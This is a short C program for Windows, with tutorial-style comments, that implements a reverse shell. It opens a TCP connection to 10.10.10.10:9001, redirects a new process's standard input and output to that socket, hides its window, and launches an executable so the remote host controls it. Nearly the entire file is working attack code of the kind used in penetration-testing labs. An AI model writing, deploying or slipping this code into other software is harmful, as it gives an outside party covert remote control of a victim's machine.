#include <ws2tcpip.h>  // Header for Winsock 2 API (socket programming)
#include <stdio.h>     // Header for standard I/O functions

int main() {
    /*
    * WSADATA struc, (contains info about window's implementation on sockets) 
    * https://learn.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata
    * https://learn.microsoft.com/en-us/windows/win32/api/ws2tcpip/
    */

    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;  // Structure to specify the server address
    STARTUPINFOA si = { 0 };    // Structure to specify the startup information for the new process
    PROCESS_INFORMATION pi;     // Structure to receive information about the newly created process

    // Initialize Winsock
    WSAStartup(MAKEWORD(1, 0), &wsaData);

    // Create a new socket
    sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    // Set up the server address structure
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("10.10.10.10");
    server.sin_port = htons(9001);

    // Connect to the specified server address and port
    WSAConnect(sock, (const PSOCKADDR)&server, sizeof(server), NULL, NULL, NULL, NULL);

    // Set up the startup information for the new process
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock; // Redirect all standard I/O to the socket
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); // Specify the flags for startup information
    si.wShowWindow = SW_HIDE;                                   // Hide the window for the new process
    si.cb = sizeof(si);                                         // Set the size of the STARTUPINFO structure

    // Ironically, the following creates a process - and as if that wasn't enough - It passes it on to the socket Socket, (&si , ...)
    CreateProcessA(
        NULL,                 // No application name, use command line instead
        "C:\\Users\\user01\\Documents\\test.exe",         // Command line to execute (the binary)
        NULL,                 // No security attributes for the process
        NULL,                 // No security attributes for the thread
        TRUE,                 // Inherit handles (so that the process will inherit the socket)
        CREATE_NEW_CONSOLE,   // Create a new console for the process
        NULL,                 // No environment block
        NULL,                 // No specific current directory
        &si,                  // Pointer to STARTUPINFO structure
        &pi                   // Pointer to PROCESS_INFORMATION structure to receive process info
    );

    
    return EXIT_SUCCESS;
}
